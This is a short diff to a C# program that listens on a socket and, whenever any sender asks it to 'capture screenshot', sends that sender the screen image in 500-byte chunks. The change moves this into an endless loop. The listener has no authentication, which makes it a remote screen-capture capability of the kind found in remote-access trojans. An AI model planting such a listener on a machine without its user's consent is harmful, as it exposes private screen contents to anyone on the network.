@@ -3,11 +3,7 @@ using System.Drawing.Imaging;
 using System.Management;
 using System.Net.Sockets;
 using System.Net;
-using System.Runtime.Versioning;
 using System.Text;
-
-
-
 
 
 var server = new Socket(
@@ -25,29 +21,28 @@ var encryptedMessage = new byte[ushort.MaxValue];
 
 EndPoint endPoint = new IPEndPoint(IPAddress.Any, 0);
 
-
-var len = server.ReceiveFrom(encryptedMessage, ref endPoint);
-var message = Encoding.Default.GetString(encryptedMessage, 0, len);
-Console.WriteLine(message);
-if (message.Contains("capture screenshot"))
+while (true)
 {
-    var ImageBytes = CaptureScreenShot();
-    int arrayCount = (int)Math.Ceiling((double)ImageBytes.Length / 500);
-
-    byte[][] bytes = new byte[arrayCount][];
-    for (int i = 0; i < arrayCount; i++)
+    var len = server.ReceiveFrom(encryptedMessage, ref endPoint);
+    var message = Encoding.Default.GetString(encryptedMessage, 0, len);
+    Console.WriteLine(message);
+    if (message.Contains("capture screenshot"))
     {
-        int remainingElements = ImageBytes.Length - i * 500;
-        int currentArraySize = Math.Min(500, remainingElements);
-        bytes[i] = new byte[currentArraySize];
-        Array.Copy(ImageBytes, i * 500, bytes[i], 0, currentArraySize);
+        var ImageBytes = CaptureScreenShot();
+        int arrayCount = (int)Math.Ceiling((double)ImageBytes.Length / 500);
+
+        byte[][] bytes = new byte[arrayCount][];
+        for (int i = 0; i < arrayCount; i++)
+        {
+            int remainingElements = ImageBytes.Length - i * 500;
+            int currentArraySize = Math.Min(500, remainingElements);
+            bytes[i] = new byte[currentArraySize];
+            Array.Copy(ImageBytes, i * 500, bytes[i], 0, currentArraySize);
+        }
+
+        for (int i = 0; i < bytes.Length; i++)
+            server.SendTo(bytes[i], endPoint);
     }
-
-    for (int i = 0; i < bytes.Length; i++)
-        server.SendTo(bytes[i], endPoint);
-
-
-
 }
 
 
